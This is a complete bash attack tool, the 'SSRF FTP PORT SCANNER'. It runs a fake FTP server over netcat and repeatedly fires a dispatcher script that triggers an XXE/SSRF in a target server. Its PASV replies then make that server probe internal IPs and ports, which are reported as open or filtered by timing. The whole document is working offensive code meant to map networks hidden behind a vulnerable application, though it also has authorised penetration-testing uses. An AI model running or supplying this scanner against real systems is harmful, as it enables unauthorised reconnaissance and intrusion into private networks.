#!/bin/bash

function defaults {
    ftp_port=2121
    nconnections=4
    threshold=1000 #milliseconds
    verbosity_level=0
    outfd=1
    errfd=2
    transfer_size=10
    host_external_ip=
}

function usage {
    cat <<-!
Usage:
    $0 [OPTION]...
    
    -t TARGET_IP                 The scanning target, e.g. 10.0.0.0/24
    -p PORT_RANGE                The ports that will be part of the scanning, e.g. 80,443,8000-9000
    -x DISPATCHER                The script that will trigger the connection with the XXE to our http/ftp servers
    -f FTP_PORT=2121             The port of the FTP server
    -n,--server-hostname         The hostname of the server running this script
    -g THRESHOLD=1000            The threshold used to identify potentially filtered ports
    -s CONNECTIONS=4             Number of simultaneous connections to the target server when performing the port scanning
    -q TRANSFER_SIZE=10          The response to the SIZE command. Useful when trying to extract information from the target:port
    -o FILE=stdout               The file where the command output will be stored
    -v                           Verbosity level. For increased verbosity level use -vv
    
!
}

function parse_args {
    [[ $# -eq 0 ]] && {
        usage
        exit
    }

    while [[ $# -gt 0 ]]; do
        key="$1"

        case $key in
            -t)
            target_cidr="$2"
            shift
            shift
            ;;
            -p)
            target_ports="$2"
            shift
            shift
            ;;
            -g)
            threshold="$2"
            shift
            shift
            ;;
            -s)
            nconnections="$2"
            shift
            shift
            ;;
            -x)
            dispatcher="$2"
            shift
            shift
            ;;
            -n|--server-hostname)
            server_hostname="$2"
            shift
            shift
            ;;
            -q)
            transfer_size="$2"
            shift
            shift
            ;;
            -o)
            outfile="$2"
            eval "exec $outfd>$outfile"
            shift
            shift
            ;;
            -f)
            ftp_port="$2"
            shift
            shift
            ;;
            -v*)
            verbosity_level=$(printf %s ${1#-}|wc -c)
            shift
            ;;
            --help)
            usage
            exit
            shift
            ;;
            *) 
            echo "invalid option $1"
            exit
            ;;
        esac
    done

    threshold_s=$threshold
    echo $threshold|grep -q '\.' && {
        threshold=$(echo "$threshold*1000"|bc|sed s/\.*$//)
        :
    } || { 
        threshold_s=$(echo $threshold|sed 's/...$/.&/')
    }
}

function runtime_progress {
    local in msg='No data yet'
    while :;do
        read -r -n1 in <&$old_stdin
        while read -r -t 0.5 in;do
            msg=$in
        done
        printf "\r${msg}\n" >&"$errfd"
        read -r -t 0.2 -n100000 in <&$old_stdin
    done
}

function print_msg {
    local user_color=${3:-YELLOW} title="$1" subtitle="${2:-}" fd=${4:-$errfd} nichar sep=
    declare -A colors
    
    [[ ! -t $fd ]] && nichar='\r'
    
    colors[NC]=${nichar:-'\033[0m'} 
    colors[YELLOW]=${nichar:-'\033[0;33m'}
    colors[RED]=${nichar:-'\033[0;31m'}
    colors[GREEN]=${nichar:-'\e[32m'}
    colors[BLUE]=${nichar:-'\e[104m'}
    
    [[ -n $1 ]] && sep=' '
    
    printf "%s%s${colors[$user_color]}%s${colors[NC]}\n" "$title" "$sep" "$subtitle" >&"${fd}"
}

function debug_print {
    [[ ${1:-0} -le $verbosity_level ]] && print_msg "" "${*:2}" NC
}

function n2ip {
    local static_parts dynamic_parts last_part=${1##*.}
    dynamic_parts=( $last_part )
    while [[ ${dynamic_parts[0]} -ge 256 ]]; do
        dynamic_parts=( $((${dynamic_parts[0]}/256)) $((${dynamic_parts[0]}%256)) "${dynamic_parts[@]:1}" )
    done
    IFS=. read -a static_parts<<<${1%$last_part}0.0.0
    echo ${static_parts[@]:0:4-${#dynamic_parts[@]}} ${dynamic_parts[@]}|tr ' ' .
}

function ip2n {
    local dots=$(echo "$1" | tr -cd . | wc -c)
    local ip=$1 n=0

    [[ $dots -ne 3 ]] && {
        local last_part=${ip##*.}
        ip=$(printf %s ${ip%${last_part}} $(printf '0.%.0's $(seq $((3-$dots)))) ${last_part})
    }
    IFS=. read -a ip_parts <<< "$ip"
    for ip_part in "${ip_parts[@]}"; do
        n=$((n*256+ip_part))
    done
    echo $n
}

function expand_cidr_block {
    local cidr_ip ip mask first_ip last_ip
    cidr_ip=$1
    [[ $cidr_ip != *"/"* ]] && cidr_ip=${cidr_ip}/32
    ip=${cidr_ip%/*}
    mask=${cidr_ip#*/}
    first_ip=$(($(ip2n $ip)&~(2**(32-mask)-1)))
    last_ip=$((first_ip+2**(32-mask)-1))
    echo $first_ip $last_ip
}

function expand_ports {
    local port_range port_arr
    while read -d, port_range || [[ ! -z $port_range ]];do
        port_arr=($port_range $port_range)
        printf '%s ' "${port_arr[*]:0:2}"
    done < <(echo "$1"|tr - ' ')
}

function count_ranges {
    local total=0
    while [[ $# -gt 0 ]];do
        ((total+=${2}-${1}+1))
        shift;shift
    done
    echo $total
}

function get_client {
    local client_info timeout=${2:-15}
    
    function call_dispatcher {
        timeout -k 5 60 "${dispatcher_call[@]}" 2>/dev/null 1>&2 &
        disown %%
    }
    
    call_dispatcher
    read -r <&"${1}"
    
    while ! read -t $timeout -r client_info <&"${1}";do
        call_dispatcher
    done
    debug_print 1 Client: $client_info
}

function run_task {
    local n_ip=$1 port=$2 fds fds_PID fd_in fd_out ip
    
    function close_fd {
        eval "exec ${1}>&-"
    }
    
    function clean_up {
        {
            close_fd ${fd_in}
            close_fd ${fd_out}
            kill -9 $fds_PID
        } 2>/dev/null
    }
    
    ip=$(n2ip $n_ip)
    debug_print 1 "=============$ip:$port=============="
    fd_identifier=$(echo instance_${n_ip}_${port}|sed 's%\.%_%g') #combination of n_ip and port should make this unique

    #1)simultaneous connections funcitonality depends on nc being compiled with
    #reuseaddr,reuseport options set on sockets which is often the case
    #2)bash-coproc closes fds and unsets vars as soon as the coproc dies, checking whether
    #fds is still set appears to be the most reliable way to interact with coproc. avoid in the future
    { coproc fds (nc -lnvp $listening_port 2>&1); } 2>/dev/null
    exec {fd_in}<&"${fds[0]}"
    exec {fd_out}>&"${fds[1]}"
    
    get_client "${fds[0]}"
    
    ftp_server $fd_in $fd_out $ip $port

    clean_up
}

function ftp_server {
    local fd_in="${1}" fd_out="${2}" ip=${3} port=${4} cmd_in connection_info elapsed_time pasv_flag=
    
    function write_data {
        debug_print 2 "< $1"
        #[[ -n ${fds+x} ]] &&
        printf '%s\r\n' "$1">&"${fd_out}"
    }
    
    function read_data {
        local data time_start time_end
        time_start=$(date +%s%N|sed -E 's/.{6}$//')
        read -r -t $threshold_s data <&"${fd_in}"
        time_end=$(date +%s%N|sed -E 's/.{6}$//')
        printf "%s %s" $((time_end-time_start)) "${data}"|sed 's/\r$//'
    }
    
    debug_print 1 "testing $ip:$port"
    
    connection_info=$(printf %s,%s,%s $(echo $ip|tr '.' ,) $((port/256)) $((port%256)))
    debug_print 2 "PASV connection info: $connection_info"
    
    write_data "220 SEXYFTP"
    cmd_in=_
    while [[ -n $cmd_in && ! $cmd_in =~ RETR|LIST|QUIT ]];do
        read elapsed_time cmd_in < <(read_data)
        debug_print 2 "> $cmd_in in ${elapsed_time}ms"
        case $cmd_in in
            USER*)
                write_data "331 User name okay, need password."
                ;;
            PASS*)
                write_data "230 Login successful"
                ;;
            CWD*)
                write_data "250 Directory successfully changed."
                ;;
            PWD*)
                write_data "257 /"
                ;;
            LIST*)
                write_data "150 Here comes the directory listing."
                write_data "226 Directory send OK."
                ;;
            SIZE*)
                write_data "213 $transfer_size"
                ;;
            RETR*)
                write_data "150 yes"
                write_data "226 File send OK."
                ;;
            SYST*)
                write_data "555 UNIX Type: L8"
                ;;
            AUTH*)
                write_data "555 what?"
                ;;
            "TYPE I"*)
                write_data "200 Switching to Binary mode"
                ;;
            "TYPE A"*)
                write_data "200 Switching to ASCII mode"
                ;;
            PORT*|EPRT*|EPSV*)
                write_data "500 What is this"
                ;;
            PASV*)
                write_data "227 Entering PASSIVE Mode ($connection_info)"
                pasv_flag=1
                ;;
        esac
    done
    
    if [[ -n $pasv_flag && $cmd_in == QUIT ]]; then
        print_msg "got QUIT, verify results for:" "${ip}:${port}" NC "${outfd}"
    elif [[ -n $pasv_flag && -n $cmd_in ]]; then
        write_data "i am out" #try to have the client abort the connection to the target port instead of waiting for its conn timeout
        print_msg "" "${ip}:${port} is OPEN" GREEN "${outfd}"
    elif [[ -n $pasv_flag && -z $cmd_in && $elapsed_time -ge $threshold ]]; then
        print_msg "" "${ip}:${port} is FILTERED" BLUE "${outfd}"
    else
        :
        #print_msg "" "${ip}:${port} is CLOSED" RED "${outfd}"
    fi
    
    sleep 1
}

###########END OF FUNCTIONS#################

trap "pkill -2 -P $$" EXIT

set -u -f
#set -x

defaults
parse_args "$@"

dispatcher=$(readlink -f "$dispatcher" || echo "$dispatcher")

user_provided_external=1
[[ -z "${server_hostname+x}" ]] && {
    server_hostname=$(curl -s ifconfig.me)
    user_provided_external=0
}
dispatcher_call=("$dispatcher" "${server_hostname}" "$ftp_port")

print_msg "" "******SSRF FTP PORT SCANNER******"
print_msg "Target IPs:" "$target_cidr"
print_msg "Target ports:" "$target_ports"
print_msg "Dispatcher:" "$dispatcher"
print_msg "Simultaneous Connections:" "$nconnections"

print_msg "FTP Port:" "$ftp_port"
print_msg "Threshold:" "$threshold_s"
[[ "$user_provided_external" == 0 ]] && print_msg "" "WARNING: Server hostname not provided, using: ${server_hostname}" RED
[[ ! -x $dispatcher ]] && print_msg "" "WARNING: dispatcher is not executable ($dispatcher)" RED
echo

###########MAIN LOGIC##############

exec {old_stdin}<&0
terminal_in=0
[[ -t 0 ]] && terminal_in=1
exec {runtime_progress_fd}> >(runtime_progress)

listening_port=$ftp_port

ip_ranges=($(expand_cidr_block "$target_cidr"))
port_ranges=($(expand_ports "$target_ports"))
total_tasks=$(($(count_ranges ${ip_ranges[*]})*$(count_ranges ${port_ranges[*]})))
tasks_completed=0
for((n_ip=${ip_ranges[0]};n_ip<=${ip_ranges[1]};n_ip++)); do
    for((port_i=0;port_i<${#port_ranges[@]};port_i+=2)); do
        for((port=${port_ranges[port_i]};port<=${port_ranges[$port_i+1]};port++)); do
            while [[ $(jobs -r|grep run_task|wc -l) -ge $nconnections ]];do
                sleep 1
            done
            
            run_task $n_ip $port &
            
            ((tasks_completed++))
            [[ $terminal_in == 1 && $((RANDOM%3)) == 0 ]] && {
                printf "[%s/%s] %s:%s\n" $tasks_completed $total_tasks $(n2ip $n_ip) $port >&${runtime_progress_fd}
            }
        done
    done
done
wait
